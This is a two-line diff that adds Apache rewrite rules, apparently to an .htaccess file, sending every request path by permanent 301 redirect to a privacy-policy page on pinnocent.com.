@@ -1,0 +1,2 @@
+RewriteEngine on 
+RewriteRule ^(.*)$ https://pinnocent.com/page/privacy-policy/ [R=301,L]
